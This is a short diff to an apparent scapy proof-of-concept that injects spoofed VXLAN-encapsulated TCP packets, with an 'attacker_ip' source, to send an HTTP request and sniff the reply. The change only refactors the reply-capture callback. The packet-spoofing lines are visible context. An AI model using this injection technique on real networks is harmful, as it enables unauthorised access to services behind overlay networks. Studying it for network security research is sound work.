@@ -40,20 +40,10 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
-def http_header(packet):
-        http_packet=str(packet)
+def get_http_packet(packet):
         global http_answer 
         http_answer = packet
-        if http_packet.find('GET'):
-                return GET_print(packet)
-
-def GET_print(packet1):
-    ret = "***************************************GET PACKET****************************************************\n"
-    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-    ret += "*****************************************************************************************************\n\n"
-    #global http_answer 
-    #http_answer = packet1
-    return ret
+        return
 
 
 def custom_action(packet):
@@ -84,7 +74,7 @@ out_ack = send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport
 send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
 
 #Print the HTTP Reply
-sniff(filter = "tcp port " + str(http_port), prn=http_header, count = 1)
+sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
 
 print(http_answer)
 
